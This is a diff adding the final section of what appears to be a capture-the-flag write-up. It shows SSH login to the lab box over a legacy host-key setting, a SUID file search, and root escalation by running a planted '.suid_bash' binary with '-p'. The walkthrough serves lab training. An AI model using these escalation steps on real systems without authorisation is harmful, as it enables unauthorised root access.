@@ -73,5 +73,46 @@ raw2dyna is a program that convert ASCII char into equivalent hexadecimal value.
 
 
 # Task 3 Attack - Get back in! 
----
-To be continued....
+
+Task given : to hack back into the system with the following command
+
+        ssh james@$IP -p 2222
+        
+if you see the following error
+
+        Unable to negotiate with $IP port 2222: no matching host key type found. Their offer: ssh-rsa
+        
+you have to add a few lines in ~/.ssh/config with your favorite editor
+
+        Host $IP 
+                HostKeyAlgorithms=+ssh-rsa
+
+It is not hard to get the user.txt flag, try to look into james folder
+
+In order to get root.txt flag, first do a search for any possible SUID misconfigured file with the following command
+
+        find / -perm /u=s -type f 2>/dev/null
+        
+and the search result will return a list of following
+
+        .
+        .
+        .
+        /bin/mount
+        /bin/fusermount
+        /bin/su
+        /bin/ping
+        /bin/umount
+        /home/james/.suid_bash
+
+The last entry is very interesting, run the file with -p as suggested by [GTFOBins](https://gtfobins.github.io/#) under SUID section and also by refering to the manual of bash with -p
+
+        If the -p option is supplied at invocation, the startup behavior is the same, but the  ef‐
+        fective user id is not reset.
+        
+        james@overpass-production:/home/james$ ./.suid_bash -p
+        .suid_bash-4.4# 
+
+Get the root.txt in root folder.
+
+# Congratulations!
